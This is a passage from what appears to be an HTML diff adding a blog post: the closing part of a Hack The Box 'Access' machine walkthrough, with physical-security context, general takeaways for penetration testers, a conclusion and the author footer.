+                        </ol>
+                    </div>
+
+                    <h3>Physical Security Context</h3>
+                    <div class="context-box">
+                        <h4>🏢 Real-World Implications</h4>
+                        <p>This machine demonstrates a common scenario where physical security systems (access control, card readers, etc.) are managed by insecure IT infrastructure. Key lessons include:</p>
+                        <ul>
+                            <li><strong>Integrated Security:</strong> Physical and IT security must be considered together</li>
+                            <li><strong>Access Control Systems:</strong> Often run on standard IT infrastructure with poor security</li>
+                            <li><strong>Backup Procedures:</strong> Physical security databases contain sensitive information requiring protection</li>
+                            <li><strong>Vendor Security:</strong> Third-party security solutions may have their own vulnerabilities</li>
+                        </ul>
+                    </div>
+
+                    <h3>Key Takeaways for Penetration Testers</h3>
+                    <div class="takeaways-box">
+                        <h4>💡 Professional Insights</h4>
+                        <ul>
+                            <li><strong>Always check for anonymous access</strong> on file sharing services</li>
+                            <li><strong>Database files often contain goldmine information</strong> - learn to analyze different formats</li>
+                            <li><strong>Email archives (PST files) frequently contain credentials</strong> and sensitive information</li>
+                            <li><strong>Look for saved credentials mechanisms</strong> in Windows environments</li>
+                            <li><strong>Legacy services often have weaker security</strong> - don't overlook them</li>
+                            <li><strong>Credential reuse is extremely common</strong> - always test found passwords across different services</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <div class="conclusion-box">
+                    <h3>🎯 Conclusion</h3>
+                    <p>The HTB Access machine provides an excellent introduction to common penetration testing techniques, focusing on the critical importance of proper credential management and access controls. This machine effectively demonstrates how seemingly separate security issues can be chained together to achieve complete system compromise.</p>
+                    
+                    <p>The scenario is particularly relevant to real-world environments where physical security systems are often managed by poorly secured IT infrastructure, making it an invaluable learning experience for both beginners and professionals in cybersecurity.</p>
+                </div>
+
+                <!-- Share Section -->
+                <div class="share-section">
+                    <h3>📢 Share This Walkthrough</h3>
+                    <div class="share-buttons">
+                        <a href="https://twitter.com/intent/tweet?text=HTB%20Access%20Machine%20Walkthrough&url=https://pixrei.xyz/blog/CTF/htb-access.html" target="_blank" class="share-btn twitter">
+                            <i class="fab fa-twitter"></i> Twitter
+                        </a>
+                        <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://pixrei.xyz/blog/CTF/htb-access.html" target="_blank" class="share-btn linkedin">
+                            <i class="fab fa-linkedin"></i> LinkedIn
+                        </a>
+                        <a href="mailto:?subject=HTB%20Access%20Walkthrough&body=Check%20out%20this%20detailed%20walkthrough:%20https://pixrei.xyz/blog/CTF/htb-access.html" class="share-btn email">
+                            <i class="fas fa-envelope"></i> Email
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <footer class="blog-post-footer">
+                <div class="author-info">
+                    <a href="https://pixrei.xyz" target="_blank" style="text-decoration: none;">
+                        <div class="author-avatar"></div>
+                    </a>
+                    <div class="author-details">
+                        <h4>R3i 0Trox</h4>
+                        <p>Red Teamer & CTF Player</p>
+                        <p>Passionate about cybersecurity, penetration testing, and sharing knowledge through detailed writeups.</p>
+                    </div>
+                </div>
+                
+                <div class="post-navigation">
+                    <a href="../index.html" class="nav-button">
+                        <i class="fas fa-arrow-left"></i> All Posts
+                    </a>
+                    <a href="../../index.html#last-section" class="nav-button">
+                        Contact <i class="fas fa-arrow-right"></i>
+                    </a>
+                </div>
+
+                <div class="post-meta-footer">
+                    <p><strong>Published:</strong> July 31, 2025</p>
+                    <p><strong>Category:</strong> CTF Writeups</p>
+                    <p><strong>Tags:</strong> HackTheBox, FTP, Database Analysis, Windows, Privilege Escalation</p>
+                </div>
+            </footer>
+        </div>
+    </article>
+
+    <script src="../../first.js"></script>
+</body>
+</html>
